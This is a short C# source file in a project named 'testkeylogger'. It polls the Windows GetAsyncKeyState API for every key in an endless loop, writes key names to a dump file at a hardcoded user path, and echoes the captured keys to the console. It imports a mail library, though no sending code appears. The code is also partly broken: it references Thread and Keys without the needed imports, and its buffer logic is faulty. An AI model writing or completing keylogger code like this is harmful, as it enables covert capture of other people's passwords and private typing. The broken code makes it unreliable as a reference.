using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
//using System.Windows.Form;
using System.Net.Mail;
using System.Net;


namespace testkeylogger
{
    class Program
    {
        public static string GetVirtualKeyString(int keyCode)
        {
            char[] keyName = new char[256];
            int result = GetKeyNameText(keyCode << 16, keyName, keyName.Length);
            if (result > 0)
            {
                return new string(keyName, 0, result);
            }
            return string.Empty;
        }

        private static string buffer = "";
        [STAThread]
        static void Main(string[] args)
        {
            StreamWriter sw = new StreamWriter(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\dump.txt");
            if (File.Exists(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\keylogger.txt") || File.Exists(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\dump.txt"))
            {
                File.Delete(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\keylogger.txt");

            }
            File.Create(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\keylogger.txt");
           
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    sw.WriteLine(GetVirtualKeyString(key));
                    if (key == 1 || key == 32769)
                    {
                        buffer += ((Keys)i).ToString();
                        if (((Keys)i) == Keys.Space)
                        {
                            buffer = " ";
                            continue;
                        }
                        if (((Keys)i) == Keys.Enter)
                        {
                            buffer += "\r\n";
                            continue;
                        }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton)
                        {
                            continue;
                        }
                        if (((Keys)i).ToString().Length == 1)
                        {
                            buffer += ((Keys)i);
                            Console.Write(buffer);
                        }
                        if (buffer.Length > 10)
                        {
                            //File.AppendAllText(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\keylogger\keylogger.txt", buffer);
                            buffer = "";
                        }

                    }
                }

            }
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        public static extern int GetKeyNameText(int lParam, [Out] char[] lpString, int nSize);
    }


}